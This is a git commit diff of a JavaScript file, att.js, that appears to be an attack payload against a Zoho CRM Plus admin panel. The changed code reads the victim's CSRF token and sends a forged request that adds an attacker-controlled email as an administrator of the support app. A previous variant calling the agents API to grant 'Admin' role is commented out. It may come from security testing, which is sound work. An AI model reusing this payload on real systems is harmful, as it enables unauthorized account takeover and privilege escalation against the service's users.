04f529abfb8ba62ab7a9a942b88e6790d7d3ef66
clevermoriarty <clevermoriarty@yahoo.com>
2024-12-04 17:12:00 +0530

    Update att.js

--- att.js
+++ att.js
@@ -33,12 +33,13 @@ function getPlainResponse(action, params) {
     objHTTP.open('POST', action, false);
     objHTTP.setRequestHeader('Content-Type','application/x-www-form-urlencoded;charset=UTF-8');
     objHTTP.setRequestHeader('Content-length', params.length);
-    objHTTP.setRequestHeader('X-ZCSRF-TOKEN',"crmcsrfparam="+findCsrf('crmcsr'))
-    objHTTP.send(params);
-    
+    objHTTP.send(params);    
     return objHTTP;
-
 }
 
-var params= {"firstName":"","lastName":"clevermoriarty","associatedDepartmentIds":["4000000099140"],"rolePermissionType":"Admin","aboutInfo":"","mobile":"","phone":"","extn":"","status":"ACTIVE","emailId":"clevermoriarty@yahoo.com"}//No I18N
-var result = getPlainResponse('https://crmplus.zoho.com/supportapi/zd/zohocorp/api/v1/agents?portalname=zohocorp', JSON.stringify(params)); //No I18N 
+//var params= {"firstName":"","lastName":"clevermoriarty","associatedDepartmentIds":["4000000099140"],"rolePermissionType":"Admin","aboutInfo":"","mobile":"","phone":"","extn":"","status":"ACTIVE","emailId":"clevermoriarty@yahoo.com"}//No I18N
+//var result = getPlainResponse('https://crmplus.zoho.com/supportapi/zd/zohocorp/api/v1/agents?portalname=zohocorp', JSON.stringify(params)); //No I18N 
+
+var csrfToken = findCsrf('crmcsr');
+var data = 'cmcsrfparam='+csrfToken+'&action=adduser&data={"email_id":"clevermoriarty1@yahoo.com","last_name":"clevermoriarty","apps":[{"app_name":"support","zaaid":"4241905","is_service_admin":false,"is_admin":true,"is_agent":false,"departments":[{"department_id":"4000000099140","chat_enabled":false}],"skip_no_permission":true}],"is_active":true}';
+var result = getPlainResponse('https://crmplus.zoho.com/zohocorppace/adminpanel.do',data);
